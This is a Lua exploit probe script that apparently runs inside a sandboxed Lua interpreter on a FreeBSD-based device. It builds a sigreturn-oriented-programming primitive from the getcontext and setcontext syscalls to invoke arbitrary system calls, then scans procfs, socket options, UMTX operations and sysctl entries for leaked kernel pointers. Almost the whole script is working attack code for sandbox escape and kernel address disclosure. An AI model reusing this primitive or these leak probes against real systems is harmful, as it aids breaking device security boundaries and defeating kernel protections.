-- CRASH_CLASS: LOW
-- PROBE 143b: procfs + socket opts + UMTX semaphore + kevent close race

print("=== PROBE 143b ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hex(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X%08X", v.h, v.l)
    end
    return string.format("0x%X", tonumber(v) or 0)
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local sc20 = make_syscall(20)
local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)

local pid = to_num(sc20())
print("pid=" .. pid)

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x100000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)

local function ua(v)
    if type(v) == "table" and v.h then
        return uint64(string.format("0x%X%08X", v.h, v.l))
    end
    return uint64(string.format("0x%X", to_num(v)))
end

local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local base_rip = memory.read_qword(srop_ctx + MC + 0xA0)
local brh, brl = get_hi_lo(base_rip)
local sc_addr = uint64(string.format("0x%X%08X", brh, brl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    return rv
end

local function make_path(base, path)
    for ci = 0, #path - 1 do
        local off = ci
        local addr = base + off - (off % 4)
        local cur = safe_rd(addr) or 0
        local shift = (off % 4) * 8
        cur = cur - (math.floor(cur / 2^shift) % 256) * 2^shift
            + string.byte(path, ci + 1) * 2^shift
        wd(addr, cur)
    end
    local toff = #path
    local taddr = base + toff - (toff % 4)
    local tcur = safe_rd(taddr) or 0
    local tshift = (toff % 4) * 8
    tcur = tcur - (math.floor(tcur / 2^tshift) % 256) * 2^tshift
    wd(taddr, tcur)
end

--------------------------------------------------------------------
-- [A] Try procfs paths
--------------------------------------------------------------------
print("--- [A] procfs ---")

local paths = {"/proc", "/proc/curproc", "/proc/curproc/status",
               "/proc/curproc/map", "/proc/curproc/mem",
               "/proc/" .. pid, "/proc/" .. pid .. "/status"}
local path_buf = gpu + 0x100

for _, p in ipairs(paths) do
    make_path(path_buf, p)
    local rv = srop(5, ua(path_buf), uint64(0))  -- O_RDONLY
    local rh, rl = get_hi_lo(rv)
    if rl < 256 and rh == 0 then
        print("[A] " .. p .. " fd=" .. rl .. " OPEN!")
        local rbuf = gpu + 0x1000
        for off = 0, 0xFF, 4 do wd(rbuf + off, 0) end
        local rv_r = srop(3, uint64(rl), ua(rbuf), uint64(256))
        local rrh, rrl = get_hi_lo(rv_r)
        if rrl > 0 and rrl < 256 then
            print("[A] read " .. rrl .. " bytes!")
            for off = 0, math.min(rrl - 1, 127), 8 do
                local q = safe_rq(rbuf + off)
                if q then
                    local qh, ql = get_hi_lo(q)
                    if qh >= 0xFFFF8000 then
                        print("[A] *** KPTR " .. p .. " +" .. string.format("%02X", off) .. "=" .. hex(q))
                    end
                end
            end
        else
            print("[A] " .. p .. " read=" .. rrl)
        end
        srop(6, uint64(rl))
    end
end

--------------------------------------------------------------------
-- [B] Socket options scan
-- getsockopt(fd, level, optname, optval, optlen)
-- Try various options that might return kernel data
--------------------------------------------------------------------
print("")
print("--- [B] Socket opts ---")

-- Create socket
local sp = gpu + 0x2000
wd(sp, 0xDEAD); wd(sp + 4, 0xDEAD)
srop(135, uint64(1), uint64(1), uint64(0), ua(sp))
local sock_fd = safe_rd(sp) or 0
print("[B] sock=" .. sock_fd)

if sock_fd ~= 0xDEAD then
    local optbuf = gpu + 0x3000
    local optlen = gpu + 0x3200

    -- SOL_SOCKET options (level=0xFFFF)
    local sol_opts = {
        {0x1001, "SO_SNDBUF"}, {0x1002, "SO_RCVBUF"},
        {0x1003, "SO_SNDLOWAT"}, {0x1004, "SO_RCVLOWAT"},
        {0x1005, "SO_SNDTIMEO"}, {0x1006, "SO_RCVTIMEO"},
        {0x1007, "SO_ERROR"}, {0x1008, "SO_TYPE"},
        {0x1009, "SO_LABEL"}, {0x100A, "SO_PEERLABEL"},
        {0x100B, "SO_LISTENQLIMIT"}, {0x100C, "SO_LISTENQLEN"},
        {0x100D, "SO_LISTENINCQLEN"},
        {0x1011, "SO_PROTOCOL"}, {0x1012, "SO_TS_CLOCK"},
        {0x0004, "SO_DONTROUTE"}, {0x0020, "SO_ACCEPTCONN"},
        {0x1015, "SO_DOMAIN"},
    }

    for _, opt in ipairs(sol_opts) do
        for off = 0, 0x1F, 4 do wd(optbuf + off, 0) end
        wd(optlen, 256)
        local rv = srop(118, uint64(sock_fd), uint64(0xFFFF), uint64(opt[1]),
                        ua(optbuf), ua(optlen))
        local rh, rl = get_hi_lo(rv)
        if rl == 0 and rh == 0 then
            local olen = safe_rd(optlen) or 0
            local v0 = safe_rd(optbuf) or 0
            if v0 ~= 0 or olen > 4 then
                print("[B] " .. opt[2] .. "=" .. v0 .. " len=" .. olen)
            end
            if olen > 8 then
                for off = 0, math.min(olen - 1, 31), 8 do
                    local q = safe_rq(optbuf + off)
                    if q then
                        local qh, ql2 = get_hi_lo(q)
                        if qh >= 0xFFFF8000 then
                            print("[B] *** KPTR " .. opt[2] .. " +" .. string.format("%02X", off) .. "=" .. hex(q))
                        end
                    end
                end
            end
        end
    end

    -- IPPROTO_IP options (level=0)
    local ip_opts = {
        {0x01, "IP_OPTIONS"}, {0x03, "IP_TOS"},
        {0x15, "IP_RECVTOS"}, {0x16, "IP_RECVTTL"},
    }
    for _, opt in ipairs(ip_opts) do
        for off = 0, 0x1F, 4 do wd(optbuf + off, 0) end
        wd(optlen, 256)
        local rv = srop(118, uint64(sock_fd), uint64(0), uint64(opt[1]),
                        ua(optbuf), ua(optlen))
        local rh, rl = get_hi_lo(rv)
        if rl == 0 and rh == 0 then
            local olen = safe_rd(optlen) or 0
            print("[B] " .. opt[2] .. " len=" .. olen)
        end
    end
end

--------------------------------------------------------------------
-- [C] UMTX semaphore ops
--------------------------------------------------------------------
print("")
print("--- [C] UMTX sem ---")

local sem = gpu + 0x4000
for off = 0, 0x1F, 4 do wd(sem + off, 0) end

-- UMTX_OP_SEM2_WAIT = 22, UMTX_OP_SEM2_WAKE = 23
-- Initialize sem with count=1
wd(sem, 1)  -- has_waiters | count

local ops = {
    {22, "SEM2_WAIT"}, {23, "SEM2_WAKE"},
    {7, "MUTEX_LOCK"}, {8, "MUTEX_UNLOCK"},
    {9, "SET_CEILING"},
    {10, "CV_WAIT"}, {11, "CV_SIGNAL"}, {12, "CV_BROADCAST"},
    {15, "NWAKE_PRIVATE"}, {24, "SHM"},
}

for _, op in ipairs(ops) do
    if op[1] ~= 22 and op[1] ~= 10 then  -- skip blocking ops
        for off = 0, 0x1F, 4 do wd(sem + off, 0) end
        local rv = srop(454, ua(sem), uint64(op[1]), uint64(0))
        local rh, rl = get_hi_lo(rv)
        local val0 = safe_rd(sem) or 0
        print("[C] " .. op[2] .. "(op=" .. op[1] .. ") ret=" .. rl ..
              " sem[0]=0x" .. string.format("%08X", val0))
    end
end

-- SEM2_WAKE on a zero semaphore (should increment)
wd(sem, 0)
local rv_w = srop(454, ua(sem), uint64(23), uint64(0))
local rwh, rwl = get_hi_lo(rv_w)
local sem_after = safe_rd(sem) or 0
print("[C] SEM2_WAKE ret=" .. rwl .. " sem=" .. sem_after)

--------------------------------------------------------------------
-- [D] Try interesting sysctl MIBs not yet tested
-- kern.proc.pathname (12), kern.boottime (21), kern.hostid (11)
--------------------------------------------------------------------
print("")
print("--- [D] sysctl info ---")

local sc_sysctl = make_syscall(202)
local mib = gpu + 0x5000
local outbuf = gpu + 0x5100
local oldlenp = gpu + 0x5200

-- kern.boottime: MIB = {1, 21}
wd(mib, 1); wd(mib + 4, 21)
for off = 0, 0x1F, 4 do wd(outbuf + off, 0) end
wd(oldlenp, 0x100)
local ok_s, rv_s = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf),
                     uint64(oldlenp), uint64(0), uint64(0))
end)
local sh, sl = get_hi_lo(rv_s)
print("[D] kern.boottime ret=" .. sl)
if sl == 0 then
    local bt_sec = safe_rd(outbuf) or 0
    local bt_usec = safe_rd(outbuf + 4) or 0
    print("[D] boottime sec=" .. bt_sec .. " usec=" .. bt_usec)
end

-- kern.hostid: MIB = {1, 11}
wd(mib, 1); wd(mib + 4, 11)
for off = 0, 0x1F, 4 do wd(outbuf + off, 0) end
wd(oldlenp, 0x100)
ok_s, rv_s = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf),
                     uint64(oldlenp), uint64(0), uint64(0))
end)
sh, sl = get_hi_lo(rv_s)
print("[D] kern.hostid ret=" .. sl)
if sl == 0 then
    print("[D] hostid=" .. (safe_rd(outbuf) or 0))
end

-- kern.version: MIB = {1, 4}
wd(mib, 1); wd(mib + 4, 4)
for off = 0, 0x1F, 4 do wd(outbuf + off, 0) end
wd(oldlenp, 0x100)
ok_s, rv_s = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf),
                     uint64(oldlenp), uint64(0), uint64(0))
end)
sh, sl = get_hi_lo(rv_s)
print("[D] kern.version ret=" .. sl)

-- hw.machine: MIB = {6, 1}
wd(mib, 6); wd(mib + 4, 1)
for off = 0, 0x1F, 4 do wd(outbuf + off, 0) end
wd(oldlenp, 0x100)
ok_s, rv_s = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf),
                     uint64(oldlenp), uint64(0), uint64(0))
end)
sh, sl = get_hi_lo(rv_s)
print("[D] hw.machine ret=" .. sl)

-- kern.proc.pathname: MIB = {1, 14, 12, pid}
wd(mib, 1); wd(mib + 4, 14); wd(mib + 8, 12); wd(mib + 12, pid)
for off = 0, 0xFF, 4 do wd(outbuf + off, 0) end
wd(oldlenp, 0x100)
ok_s, rv_s = pcall(function()
    return sc_sysctl(uint64(mib), uint64(4), uint64(outbuf),
                     uint64(oldlenp), uint64(0), uint64(0))
end)
sh, sl = get_hi_lo(rv_s)
local plen = safe_rd(oldlenp) or 0
print("[D] pathname ret=" .. sl .. " len=" .. plen)

if sl == 0 and plen > 0 then
    -- Read as string
    local pstr = ""
    for ci = 0, math.min(plen - 1, 127) do
        local word_off = ci - (ci % 4)
        local w = safe_rd(outbuf + word_off)
        if w then
            local shift = (ci % 4) * 8
            local ch = math.floor(w / (2^shift)) % 256
            if ch >= 32 and ch < 127 then
                pstr = pstr .. string.char(ch)
            elseif ch == 0 then break end
        end
    end
    print("[D] path=" .. pstr)
end

print("")
print("=== DONE ===")
